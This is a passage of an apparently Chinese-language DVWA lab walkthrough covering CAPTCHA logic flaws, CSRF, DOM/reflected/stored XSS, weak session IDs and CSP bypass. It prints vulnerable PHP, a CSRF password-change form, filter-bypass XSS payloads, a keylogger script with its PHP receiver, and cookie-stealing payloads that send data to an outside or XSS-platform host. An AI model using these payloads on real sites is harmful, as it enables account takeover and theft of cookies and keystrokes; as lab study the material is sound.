&#x27;SERVER_PROTOCOL&#x27; ] . &#x27; 404 Not Found&#x27; );</span><br><span class="line"></span><br><span class="line">        // Feedback for end user</span><br><span class="line">        echo &#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">//中间sleep函数起到混淆的作用</span><br></pre></td></tr></table></figure>
<p>只能使用抓包修改+bool盲注</p>
<h2 id="insecure-captcha（不安全验证码）"><a href="#insecure-captcha（不安全验证码）" class="headerlink" title="insecure captcha（不安全验证码）"></a>insecure captcha（不安全验证码）</h2><h3 id="low-3"><a href="#low-3" class="headerlink" title="low:"></a>low:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"> </span><br><span class="line">if( isset( $_POST[ &#x27;Change&#x27; ] ) &amp;&amp; ( $_POST[ &#x27;step&#x27; ] == &#x27;1&#x27; ) ) &#123; </span><br><span class="line">    // Hide the CAPTCHA form </span><br><span class="line">    $hide_form = true; </span><br><span class="line"> </span><br><span class="line">    // Get input </span><br><span class="line">    $pass_new  = $_POST[ &#x27;password_new&#x27; ]; </span><br><span class="line">    $pass_conf = $_POST[ &#x27;password_conf&#x27; ]; </span><br><span class="line"> </span><br><span class="line">    // Check CAPTCHA from 3rd party </span><br><span class="line">    $resp = recaptcha_check_answer( $_DVWA[ &#x27;recaptcha_private_key&#x27; ], </span><br><span class="line">        $_SERVER[ &#x27;REMOTE_ADDR&#x27; ], </span><br><span class="line">        $_POST[ &#x27;recaptcha_challenge_field&#x27; ], </span><br><span class="line">        $_POST[ &#x27;recaptcha_response_field&#x27; ] ); </span><br><span class="line"> </span><br><span class="line">    // Did the CAPTCHA fail? </span><br><span class="line">    if( !$resp-&gt;is_valid ) &#123; </span><br><span class="line">        // What happens when the CAPTCHA was entered incorrectly </span><br><span class="line">        $html     .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; </span><br><span class="line">        $hide_form = false; </span><br><span class="line">        return; </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123; </span><br><span class="line">        // CAPTCHA was correct. Do both new passwords match? </span><br><span class="line">        if( $pass_new == $pass_conf ) &#123; </span><br><span class="line">            // Show next stage for the user </span><br><span class="line">            echo &quot; </span><br><span class="line">                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt; </span><br><span class="line">                &lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt; </span><br><span class="line">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt; </span><br><span class="line">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;&#123;$pass_new&#125;\&quot; /&gt; </span><br><span class="line">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;&#123;$pass_conf&#125;\&quot; /&gt; </span><br><span class="line">                    &lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt; </span><br><span class="line">                &lt;/form&gt;&quot;; </span><br><span class="line">        &#125; </span><br><span class="line">        else &#123; </span><br><span class="line">            // Both new passwords do not match. </span><br><span class="line">            $html     .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;; </span><br><span class="line">            $hide_form = false; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">if( isset( $_POST[ &#x27;Change&#x27; ] ) &amp;&amp; ( $_POST[ &#x27;step&#x27; ] == &#x27;2&#x27; ) ) &#123; </span><br><span class="line">    // Hide the CAPTCHA form </span><br><span class="line">    $hide_form = true; </span><br><span class="line"> </span><br><span class="line">    // Get input </span><br><span class="line">    $pass_new  = $_POST[ &#x27;password_new&#x27; ]; </span><br><span class="line">    $pass_conf = $_POST[ &#x27;password_conf&#x27; ]; </span><br><span class="line"> </span><br><span class="line">    // Check to see if both password match </span><br><span class="line">    if( $pass_new == $pass_conf ) &#123; </span><br><span class="line">        // They do! </span><br><span class="line">        $pass_new = mysql_real_escape_string( $pass_new ); </span><br><span class="line">        $pass_new = md5( $pass_new ); </span><br><span class="line"> </span><br><span class="line">        // Update database </span><br><span class="line">        $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;; </span><br><span class="line">        $result = mysql_query( $insert ) or die( &#x27;&lt;pre&gt;&#x27; . mysql_error() . &#x27;&lt;/pre&gt;&#x27; ); </span><br><span class="line"> </span><br><span class="line">        // Feedback for the end user </span><br><span class="line">        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123; </span><br><span class="line">        // Issue with the passwords matching </span><br><span class="line">        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; </span><br><span class="line">        $hide_form = false; </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
<p>审计源码 存在逻辑漏洞 即step=2 时即判断验证通过<br>抓包改step=2<br>csrf脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  &lt;html&gt;      </span><br><span class="line">&lt;body onload=&quot;document.getElementById(&#x27;transfer&#x27;).submit()&quot;&gt;        </span><br><span class="line">  &lt;div&gt;    </span><br><span class="line">    &lt;form method=&quot;POST&quot; id=&quot;transfer&quot; action=&quot;http://192.168.153.130/dvwa/vulnerabilities/captcha/&quot;&gt;     </span><br><span class="line">		&lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;password&quot;&gt;</span><br><span class="line">		&lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;password&quot;&gt;     </span><br><span class="line">		&lt;input type=&quot;hidden&quot; name=&quot;step&quot; value=&quot;2&quot;      </span><br><span class="line">		&lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;        </span><br><span class="line">	&lt;/form&gt;        </span><br><span class="line">  &lt;/div&gt;        </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<h3 id="medium：-1"><a href="#medium：-1" class="headerlink" title="medium："></a>medium：</h3><p>多加了一行验证</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if( !$_POST[ &#x27;passed_captcha&#x27; ] ) &#123; </span><br><span class="line">        $html     .= &quot;&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;&quot;; </span><br><span class="line">        $hide_form = false; </span><br><span class="line">        return; </span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>
<p>抓包改step=2，增加参数passed_captcha=true</p>
<h3 id="high：-1"><a href="#high：-1" class="headerlink" title="high："></a>high：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if( !$resp-&gt;is_valid &amp;&amp; ( $_POST[ &#x27;recaptcha_response_field&#x27; ] != &#x27;hidd3n_valu3&#x27; || $_SERVER[ &#x27;HTTP_USER_AGENT&#x27; ] != &#x27;reCAPTCHA&#x27; ) ) &#123; </span><br><span class="line">        // What happens when the CAPTCHA was entered incorrectly </span><br><span class="line">        $html     .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; </span><br><span class="line">        $hide_form = false; </span><br><span class="line">        return; </span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>
<p>需要 resp合法 或者 recaptcha_response_field=hidd3n_valu3 http_user_agent=recaptcha<br>同样抓包修改</p>
<p>impossible:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">if( isset( $_POST[ &#x27;Change&#x27; ] ) ) &#123; </span><br><span class="line">    // Check Anti-CSRF token </span><br><span class="line">    checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); </span><br><span class="line"> </span><br><span class="line">    // Hide the CAPTCHA form </span><br><span class="line">    $hide_form = true; </span><br><span class="line"> </span><br><span class="line">    // Get input </span><br><span class="line">    $pass_new  = $_POST[ &#x27;password_new&#x27; ]; </span><br><span class="line">    $pass_new  = stripslashes( $pass_new ); </span><br><span class="line">    $pass_new  = mysql_real_escape_string( $pass_new ); </span><br><span class="line">    $pass_new  = md5( $pass_new ); </span><br><span class="line"> </span><br><span class="line">    $pass_conf = $_POST[ &#x27;password_conf&#x27; ]; </span><br><span class="line">    $pass_conf = stripslashes( $pass_conf ); </span><br><span class="line">    $pass_conf = mysql_real_escape_string( $pass_conf ); </span><br><span class="line">    $pass_conf = md5( $pass_conf ); </span><br><span class="line"> </span><br><span class="line">    $pass_curr = $_POST[ &#x27;password_current&#x27; ]; </span><br><span class="line">    $pass_curr = stripslashes( $pass_curr ); </span><br><span class="line">    $pass_curr = mysql_real_escape_string( $pass_curr ); </span><br><span class="line">    $pass_curr = md5( $pass_curr ); </span><br><span class="line"> </span><br><span class="line">    // Check CAPTCHA from 3rd party </span><br><span class="line">    $resp = recaptcha_check_answer( $_DVWA[ &#x27;recaptcha_private_key&#x27; ], </span><br><span class="line">        $_SERVER[ &#x27;REMOTE_ADDR&#x27; ], </span><br><span class="line">        $_POST[ &#x27;recaptcha_challenge_field&#x27; ], </span><br><span class="line">        $_POST[ &#x27;recaptcha_response_field&#x27; ] ); </span><br><span class="line"> </span><br><span class="line">    // Did the CAPTCHA fail? </span><br><span class="line">    if( !$resp-&gt;is_valid ) &#123; </span><br><span class="line">        // What happens when the CAPTCHA was entered incorrectly </span><br><span class="line">        echo &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; </span><br><span class="line">        $hide_form = false; </span><br><span class="line">        return; </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123; </span><br><span class="line">        // Check that the current password is correct </span><br><span class="line">        $data = $db-&gt;prepare( &#x27;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27; ); </span><br><span class="line">        $data-&gt;bindParam( &#x27;:user&#x27;, dvwaCurrentUser(), PDO::PARAM_STR ); </span><br><span class="line">        $data-&gt;bindParam( &#x27;:password&#x27;, $pass_curr, PDO::PARAM_STR ); </span><br><span class="line">        $data-&gt;execute(); </span><br><span class="line"> </span><br><span class="line">        // Do both new password match and was the current password correct? </span><br><span class="line">        if( ( $pass_new == $pass_conf) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) &#123; </span><br><span class="line">            // Update the database </span><br><span class="line">            $data = $db-&gt;prepare( &#x27;UPDATE users SET password = (:password) WHERE user = (:user);&#x27; ); </span><br><span class="line">            $data-&gt;bindParam( &#x27;:password&#x27;, $pass_new, PDO::PARAM_STR ); </span><br><span class="line">            $data-&gt;bindParam( &#x27;:user&#x27;, dvwaCurrentUser(), PDO::PARAM_STR ); </span><br><span class="line">            $data-&gt;execute(); </span><br><span class="line"> </span><br><span class="line">            // Feedback for the end user - success! </span><br><span class="line">            echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; </span><br><span class="line">        &#125; </span><br><span class="line">        else &#123; </span><br><span class="line">            // Feedback for the end user - failed! </span><br><span class="line">            echo &quot;&lt;pre&gt;Either your current password is incorrect or the new passwords did not match.&lt;br /&gt;Please try again.&lt;/pre&gt;&quot;; </span><br><span class="line">            $hide_form = false; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">// Generate Anti-CSRF token </span><br><span class="line">generateSessionToken(); </span><br><span class="line"> </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>


<h2 id="xss-dom"><a href="#xss-dom" class="headerlink" title="xss(dom)"></a>xss(dom)</h2><h3 id="low-4"><a href="#low-4" class="headerlink" title="low:"></a>low:</h3><p>直接在url中注入 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;有弹出 存在xss漏洞</span><br></pre></td></tr></table></figure>
<p>漏洞利用：通过xss平台 注入 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sCRiPt sRC=//xss8.cc/XJH3&gt;&lt;/sCrIpT&gt; 获得cookie（或自己编写js脚本）</span><br></pre></td></tr></table></figure>
<p>如果是使用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
<p>要跳出dom树</p>
<h3 id="medium-4"><a href="#medium-4" class="headerlink" title="medium:"></a>medium:</h3><p>源码中有判断</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (stripos ($default, &quot;&lt;script&quot;) !== false)</span><br><span class="line">大小写绕过失败  &lt;Script&gt;alert(&#x27;1&#x27;)&lt;/script&gt;</span><br><span class="line">多写绕过失败    &lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/script&gt;</span><br><span class="line">换标签绕过失败   &lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
<p>因为 当使用image时</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">注入：&gt;&lt;/option&gt;&lt;img src=1 onerror=alert(1)&gt;</span><br><span class="line">输出点显示为：&lt;option value=&quot;%3E%3C/option%3E%3Cimg%20src=1%20onerror=alert(1)%3E&quot;&gt;&gt;&lt;/option&gt;</span><br><span class="line">&lt;script&gt;中的代码会被浏览器直接当作js执行</span><br><span class="line">但如果是&lt;image&gt;就要先逃逸出select</span><br><span class="line">&lt;select&gt;只允许内嵌&lt;option&gt;</span><br><span class="line">&lt;option&gt;能内嵌&lt;script&gt;不能&lt;img&gt;</span><br><span class="line">所以注入</span><br><span class="line">&gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
<p>成功</p>
<h3 id="high-3"><a href="#high-3" class="headerlink" title="high:"></a>high:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// Is there any input?</span><br><span class="line">if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#x27;default&#x27; ]) ) &#123;</span><br><span class="line"></span><br><span class="line">    ## White list the al### lowable languages</span><br><span class="line">    switch ($_GET[&#x27;default&#x27;]) &#123;</span><br><span class="line">        case &quot;French&quot;:</span><br><span class="line">        case &quot;English&quot;:</span><br><span class="line">        case &quot;German&quot;:</span><br><span class="line">        case &quot;Spanish&quot;:</span><br><span class="line">            ## ok</span><br><span class="line">            break;</span><br><span class="line">        default:</span><br><span class="line">            header (&quot;location: ?default=English&quot;);</span><br><span class="line">            exit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
<p>由源码得知 检验只允许出现所给选项<br>URL的锚（＃符号之后的任何内容）可以被js读取，且不会发送到服务器，因此无法被阻止。<br>构造 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?default=English ## &lt;script&gt;alert(1)&lt;/script&gt; 且可以在源代码中出现</span><br></pre></td></tr></table></figure>

<h2 id="xss-reflected"><a href="#xss-reflected" class="headerlink" title="xss(reflected)"></a>xss(reflected)</h2><h3 id="low：-1"><a href="#low：-1" class="headerlink" title="low："></a>low：</h3><p>无保护</p>
<h3 id="medium：-2"><a href="#medium：-2" class="headerlink" title="medium："></a>medium：</h3><p>可以大小写绕过 多写绕过</p>
<h3 id="high：-2"><a href="#high：-2" class="headerlink" title="high："></a>high：</h3><p>换标签绕过：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<h2 id="xss-stored"><a href="#xss-stored" class="headerlink" title="xss(stored)"></a>xss(stored)</h2><h3 id="low-5"><a href="#low-5" class="headerlink" title="low:"></a>low:</h3><p>无保护</p>
<h3 id="medium-5"><a href="#medium-5" class="headerlink" title="medium:"></a>medium:</h3><p>可大小写和多写</p>
<h3 id="high-4"><a href="#high-4" class="headerlink" title="high:"></a>high:</h3><p>换标签绕过 前端限制长度可以通过抓包来改<br>（注入在name里 message里面没用）</p>
<h3 id="记录xss一些危害代码："><a href="#记录xss一些危害代码：" class="headerlink" title="记录xss一些危害代码："></a>记录xss一些危害代码：</h3><p>innerHTML: 篡改页面</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.body.innerHTML=&quot;&lt;div style=visibility:visible;&gt;&lt;h1&gt;DOM XSS By SKI12&lt;/h1&gt;&lt;/div&gt;&quot;;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>document.onkeypress:键盘记录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://127.0.0.1/keylogger.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>js代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">document.onkeypress=function(evt)&#123;</span><br><span class="line">   evt=evt || window.event</span><br><span class="line">   key=String.fromCharCode(evt.charCode)</span><br><span class="line">   if(key)&#123;</span><br><span class="line">     var http=new XMLHttpRequest();</span><br><span class="line">     var param=encodeURI(key);</span><br><span class="line">     http.open(&quot;POST&quot;,&quot;http://127.0.0.1/keylogger.php&quot;,true);</span><br><span class="line">     http.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">     http.send(&quot;key=&quot;+param);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>php代码：（接收js传输回来的信息）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   $key=$_POST[&#x27;key&#x27;];</span><br><span class="line">   $logfile=&#x27;keylog.txt&#x27;;</span><br><span class="line">   $fp=fopen($logfile,&quot;a&quot;);</span><br><span class="line">   fwrite($fp,$key);</span><br><span class="line">   fclose($fp)</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>creatElement(): 窃取cookie：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;var img=document.createElement(&quot;img&quot;);img.src=&quot;http://127.0.0.1:8000/a?&quot;+escape(document.cookie);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="weak-session-ids"><a href="#weak-session-ids" class="headerlink" title="weak session ids"></a>weak session ids</h2><p>当用户登录后，在服务器就会创建一个会话(session)，叫做会话控制，接着访问页面的时候就不用登录，只需要携Sesion去访问。<br>sessionID作为特定用户访问站点所需要的唯一内容。如果能够计算或轻易猜到该sessionID，则攻击者将可以轻易获取访问权限。</p>
<h3 id="low：-2"><a href="#low：-2" class="headerlink" title="low："></a>low：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Cookie: dvwaSession=2; security=### low; PHPSESSID=pp0qtc5p4k1mpm7bahf6ec8vb6</span><br><span class="line">Cookie: dvwaSession=3; security=### low; PHPSESSID=pp0qtc5p4k1mpm7bahf6ec8vb6</span><br><span class="line">Cookie: dvwaSession=4; security=### low; PHPSESSID=pp0qtc5p4k1mpm7bahf6ec8vb6</span><br><span class="line">Cookie: dvwaSession=5; security=### low; PHPSESSID=pp0qtc5p4k1mpm7bahf6ec8vb6</span><br></pre></td></tr></table></figure>
<p>找规律可得 cookie变化为dvwasession每次加一</p>
<h3 id="medium-6"><a href="#medium-6" class="headerlink" title="medium:"></a>medium:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cookie: dvwaSession=1612706387; security=### medium; PHPSESSID=pp0qtc5p4k1mpm7bahf6ec8vb6</span><br><span class="line">Cookie: dvwaSession=1612706413; security=### medium; PHPSESSID=pp0qtc5p4k1mpm7bahf6ec8vb6</span><br><span class="line">Cookie: dvwaSession=1612706455; security=### medium; PHPSESSID=pp0qtc5p4k1mpm7bahf6ec8vb6</span><br></pre></td></tr></table></figure>
<p>猜测是时间<br>可以用在线时间戳转换工具<a target="_blank" rel="noopener" href="https://tool.lu/timestamp/%EF%BC%88%E8%AE%A1%E7%AE%97%E5%A5%BD%E6%94%BB%E5%87%BB%E6%97%B6%E9%97%B4%EF%BC%89">https://tool.lu/timestamp/（计算好攻击时间）</a></p>
<h3 id="high-5"><a href="#high-5" class="headerlink" title="high:"></a>high:</h3><p>md5处理了### low的12345…<br>找个网站在线md5就好</p>
<h3 id="impossible-1"><a href="#impossible-1" class="headerlink" title="impossible:"></a>impossible:</h3><p>随机数+时间戳 不可伪造</p>
<h2 id="CSP-bypass"><a href="#CSP-bypass" class="headerlink" title="CSP bypass"></a>CSP bypass</h2><p>csp:Content Security Policy （CSP）内容安全策略，是一个附加的安全层，有助于检测并缓解某些类型的攻击，包括跨站脚本（XSS）和数据注入攻击。</p>
<h3 id="low：-3"><a href="#low：-3" class="headerlink" title="low："></a>low：</h3><p>文件头中存在的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &#x27;self&#x27; https://pastebin.com hastebin.com example.com code.jquery.com https://ssl.google-analytics.com ;</span><br></pre></td></tr></table></figure>
<p>源码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (isset ($_POST[&#x27;include&#x27;])) &#123;</span><br><span class="line">$page[ &#x27;body&#x27; ] .= &quot;</span><br><span class="line">    &lt;script src=&#x27;&quot; . $_POST[&#x27;include&#x27;] . &quot;&#x27;&gt;&lt;/script&gt;</span><br><span class="line">&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据标签中的内容判断在pastebin网站上写js代码可以被执行<br>理论上 是 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include https://pastebin.com/raw/AEa42UZK </span><br></pre></td></tr></table></figure>
<p>这样一个网页就行了的 然而 我的页面没有弹窗。。<br>没有办法</p>
<h3 id="medium：-3"><a href="#medium：-3" class="headerlink" title="medium："></a>medium：</h3><p>头文件中出现：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#x27;;</span><br><span class="line"></span><br><span class="line">unsafe-inline：</span><br><span class="line"> Al### lows the use of inline resources, such as inline `&lt;script&gt;` elements, javascript: URLs, inline event handlers, and inline &lt;style&gt; elements. You must include the single quotes.</span><br><span class="line">nonce-</span><br><span class="line">A whitelist for specific inline scripts using a cryptographic nonce (number used once). The server must generate a unique nonce value each time it transmits a policy. It is critical to provide an unguessable nonce, as bypassing a resource’s policy is otherwise trivial. </span><br></pre></td></tr></table></figure>
<p>直接输入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

